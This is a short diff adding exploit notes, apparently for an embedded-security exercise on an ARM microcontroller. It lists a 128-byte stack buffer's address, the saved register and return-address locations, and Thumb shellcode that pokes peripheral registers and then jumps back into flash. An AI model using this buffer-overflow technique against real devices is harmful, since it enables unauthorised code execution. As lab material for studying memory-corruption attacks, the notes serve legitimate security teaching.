@@ -1,0 +1,31 @@
+buffer start address: 0x10000724 (buffer size 128 uint_8)
+linkregister content(return address):
+
+previous stack frame:
+
+&r4: 0x100007ac
+&r5: 0x100007b0
+&r6: 0x100007b4
+&r7: 0x100007b8
+&lr: 0x100007bc
+
+assembly code:
+    mov  sp, pc
+    movw r2, #0x8101
+    movt r2, #0x4802
+    movs r1, #0x80
+    strb r1, [r2, #0xf]
+    strb r1, [r2, #0x10]
+    movs r1, #3
+    strb r1, [r2, #3]
+
+    movw  r2, #0x0325
+    movt  r2, #0x0800
+    add sp, #0x8C
+    mov   pc, r2   
+
+
+
+
+
+
